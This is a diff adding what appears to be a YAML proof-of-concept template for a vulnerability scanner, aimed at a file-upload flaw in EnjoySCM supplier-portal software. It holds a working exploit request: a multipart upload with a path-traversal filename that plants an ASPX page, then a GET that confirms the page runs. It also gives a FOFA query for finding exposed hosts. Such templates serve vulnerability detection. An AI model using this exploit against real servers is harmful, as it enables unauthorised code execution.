@@ -1,0 +1,33 @@
+id: poc-yaml-enjoyscm-importdata-upload
+info:
+  name: 捷诚EnjoySCM ImportData 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: EnjoySCM
+  fofa: body="供应商网上服务厅"
+variables:
+  filename: to_lower(random_str(10))
+requests:
+- method: POST
+  path: /ImportData/UploadFile
+  headers:
+    Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+  data: '------21909179191068471382830692394
+
+    Content-Disposition: form-data; name="file"; filename="../../../{{.filename}}.aspx"
+
+    Content-Type: image/jpeg
+
+
+    <%@Page Language="C#"%><%Response.Write("Hello World");%>
+
+    ------21909179191068471382830692394--
+
+    '
+  expression: "status_code == 200 && \ncontains(body,\"\\\"ObjectData\\\"\") &&\n\
+    contains(body,\"\\\"UniqueKey\\\"\")\n"
+- method: GET
+  path: /{{.filename}}.aspx
+  expression: "status_code == 200 && \nbody == \"Hello World\"\n"
+transport: http
